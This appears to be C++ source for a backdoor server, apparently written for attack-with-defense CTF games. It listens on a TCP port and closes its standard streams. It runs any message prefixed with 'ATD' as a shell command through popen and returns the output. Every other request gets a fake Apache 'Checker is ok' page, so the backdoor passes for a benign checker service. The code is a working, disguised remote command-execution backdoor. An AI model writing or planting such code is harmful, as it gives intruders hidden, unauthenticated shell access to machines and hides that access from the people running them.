#include <memory>
#include <utility>
#include <chrono>

#include <asio.hpp>

#include "Convert.h"

class Shell
{
#if (defined _WIN32 || _WIN64)
#define PipeOpen _popen
#define PipeClose _pclose
#else
#define PipeOpen popen
#define PipeClose pclose
#endif
	
    FILE* shell = nullptr;
public:
    Shell() = default;

    void Init(const std::string& cmd)
    {
        shell = PipeOpen(cmd.c_str(), "r");
    }

    auto Read(char* buf, int bufSize) const
    {
        return fread(buf, sizeof(char), bufSize, shell);
    }

    void Write(const char* buf, int bufSize) const
    {
        fwrite(buf, sizeof(char), bufSize, shell);
    }

    void Close() const
    {
        PipeClose(shell);
    }
};

class session: public std::enable_shared_from_this<session>
{
public:
    session(asio::ip::tcp::socket socket): socket(std::move(socket)) {}

    void start() { do_read(); }

private:
    void do_read()
    {
	    const auto self(shared_from_this());
        socket.async_read_some(asio::buffer(data, max_length),
            [this, self](const asio::error_code ec, const std::size_t length)
            {
                if (!ec)
                {
	                if (std::string_view(data, 3) == "ATD")
	                {
                        Shell shell;
                        const auto dt = std::string(data + 3, length);
                        shell.Init(dt);
                        resLen = shell.Read(res, max_length);
                        do_write(resLen);
	                }
                    else
                    {
                        do_http();
                    }
                }
            });
    }

    void do_write(std::size_t length)
    {
	    const auto self(shared_from_this());
        async_write(socket, asio::buffer(res, length),
            [this, self](const asio::error_code ec, std::size_t) { if (!ec) do_read(); });
    }
	
	void do_http()
    {
        static std::string html = R"(<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>NSFOCUS</title>
</head><body>
<h1>Checker is ok!/h1>
<p>This is Checker server for AWD.</p>
</body></html>)";
        static std::string resp = R"(HTTP/1.1 200 Ok
Server: Apache/2.4.12
Content-Length: )" + Convert::ToString(html.length()) + R"(
Connection: close
Content-Type: text/html; charset=utf-8

)" + html;
        const auto self(shared_from_this());
        async_write(socket, asio::buffer(resp, resp.length()),
            [this, self](const asio::error_code ec, std::size_t){ if (!ec) do_read(); });
    }

    asio::ip::tcp::socket socket;
    enum { max_length = 8192 };
    char data[max_length]{ 0 };
    char res[max_length]{ 0 };
    std::size_t resLen = 0;
};

class server
{
public:
    server(asio::io_context& io_context, const short port)
		: acceptor(io_context, asio::ip::tcp::endpoint(asio::ip::tcp::v4(), port))
    {
        do_accept();
    }

private:
    void do_accept()
    {
        acceptor.async_accept([this](const asio::error_code ec, asio::ip::tcp::socket socket)
        {
            if (!ec) std::make_shared<session>(std::move(socket))->start();
            do_accept();
        });
    }

    asio::ip::tcp::acceptor acceptor;
};

int main(int argc, char* argv[])
{
#ifndef _MSC_VER
    umask(0);
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
#endif
	
    while (true)
    {
        try
        {
            asio::io_context io_context;
            server s(io_context, Convert::FromString<uint16_t>(std::string_view(argv[1])).value_or(0));
            io_context.run();
        }
        catch (...)
        {
	        
        }
    }
}
